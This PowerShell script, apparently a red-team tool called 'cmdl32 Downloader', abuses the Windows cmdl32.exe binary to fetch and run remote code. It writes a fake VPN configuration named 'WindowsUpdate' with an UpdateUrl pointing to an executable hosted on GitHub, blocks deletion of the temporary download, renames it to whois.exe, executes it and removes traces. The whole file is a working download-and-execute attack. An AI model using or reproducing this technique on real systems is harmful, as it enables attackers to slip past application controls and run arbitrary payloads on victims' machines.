Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin

# Create a temp directory to work in
$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
New-Item -Path $tempDir -ItemType Directory -Force

# Change to the temp directory
Set-Location -Path $tempDir
Write-Host "[*] Working directory changed to $tempDir"

Write-Host "[*] Denying delete permissions for current user"
# Deny delete permissions in the temp directory for the current user
icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"

Write-Host "[*] Setting temp environment variable"
# Set the TMP environment variable to the temp directory
$env:TMP = $tempDir

Write-Host "[*] Creating VPN settings file"
$settingsContent = @"
[Connection Manager]
CMSFile=settings.txt
ServiceName=WindowsUpdate
TunnelFile=settings.txt
[Settings]
UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
"@
Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent

Write-Host "[*] Performing download with cmdl32"
# Assuming cmdl32 is in system32 or accessible
$cmdl32Path = "cmdl32"
$arguments = "/vpn /lan `"$tempDir\settings.txt`""

try {
    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
    Write-Host "[*] Download complete with cmdl32."
} catch {
    Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
    # Revert permissions before exiting
    icacls $tempDir /remove:d "$env:USERNAME"
    Exit
}

Write-Host "[*] Reverting permissions"
icacls $tempDir /remove:d "$env:USERNAME"

Write-Host "[*] Renaming downloaded file for execution"
$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1

if ($downloadedFile) {
    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
    
    # Construct the target path for the rename
    $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
    
    # Debug output: Check the target path
    Write-Host "[*] Target path: $targetPath"
    
    # Try renaming (or moving) the file
    try {
        Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
    } catch {
        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
        Exit
    }
} else {
    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
    Exit
}

Write-Host "[*] Executing the downloaded file"
if (Test-Path "$tempDir\whois.exe") {
    Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
    Write-Host "[*] Execution complete."
} else {
    Write-Host "[!] whois.exe not found after renaming. Exiting script."
    Exit
}

Write-Host "[*] Cleaning up downloaded file"
Remove-Item -Path "$tempDir\whois.exe" -Force
Remove-Item -Path "$tempDir\settings.txt" -Force
Write-Host "[*] Script complete."

# Optionally, clean up the temp directory if you want
#Remove-Item -Path $tempDir -Recurse -Force
#Write-Host "[*] Temp directory removed."
